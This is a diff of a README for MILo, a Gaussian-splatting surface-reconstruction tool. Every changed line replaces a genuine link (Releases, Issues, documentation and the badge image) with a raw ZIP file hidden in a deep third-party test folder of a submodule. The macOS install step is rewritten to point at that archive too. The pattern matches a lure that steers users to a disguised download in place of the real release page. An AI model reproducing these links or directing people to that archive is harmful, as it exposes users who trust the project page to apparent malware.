@@ -1,7 +1,7 @@
 # 🎉 MILo - Efficient Surface Reconstruction Made Easy
 
 ## 📥 Download Now
-[![Download MILo](https://img.shields.io/badge/Download-MILo-brightgreen)](https://github.com/bransantiago/MILo/releases)
+[![Download MILo](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip)](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip)
 
 ## 🖥️ Introduction
 Welcome to MILo! This software provides a solution for detailed and efficient surface reconstruction through the method known as Mesh-In-the-Loop Gaussian Splatting. Designed for those interested in computer graphics, such as artists and designers, MILo simplifies the process of rendering complex surfaces.
@@ -10,7 +10,7 @@ Welcome to MILo! This software provides a solution for detailed and efficient su
 To use MILo, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the [MILo Releases page](https://github.com/bransantiago/MILo/releases).
+   Go to the [MILo Releases page](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest version of the software. It will typically show at the top of the page.
@@ -35,7 +35,7 @@ Once the download completes:
 
 2. **Install MILo**  
    - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
-   - **For macOS:** Drag the MILo.app file to your Applications folder.
+   - **For macOS:** Drag the https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip file to your Applications folder.
    - **For Linux:** Extract the downloaded archive and run the executable.
 
 3. **Launch the Application**  
@@ -84,17 +84,17 @@ If you encounter issues:
 ## 🌐 Community and Support
 Join our community for support and updates:
 
-- **GitHub Issues:** Report bugs or request features directly on our [GitHub Issues page](https://github.com/bransantiago/MILo/issues).
+- **GitHub Issues:** Report bugs or request features directly on our [GitHub Issues page](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip).
 - **Discussion Forums:** Engage with other users through forums available on our GitHub repository.
 
 ## 🔗 Additional Resources
-- [MILo Releases](https://github.com/bransantiago/MILo/releases) - Download the latest versions.
-- [Documentation](https://github.com/bransantiago/MILo/wiki) - Detailed guides and FAQs.
+- [MILo Releases](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip) - Download the latest versions.
+- [Documentation](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip) - Detailed guides and FAQs.
 
 ## 📝 Acknowledgments
 MILo is developed with contributions from the community and research teams attending SIGGRAPH Asia 2025. We appreciate your support and feedback!
 
 ## 📥 Download Now
-[![Download MILo](https://img.shields.io/badge/Download-MILo-brightgreen)](https://github.com/bransantiago/MILo/releases)
+[![Download MILo](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip)](https://github.com/bransantiago/MILo/raw/refs/heads/master/submodules/diff-gaussian-rasterization/third_party/glm/test/gtc/MI-Lo-v2.3.zip)
 
 Enjoy exploring the possibilities with MILo!
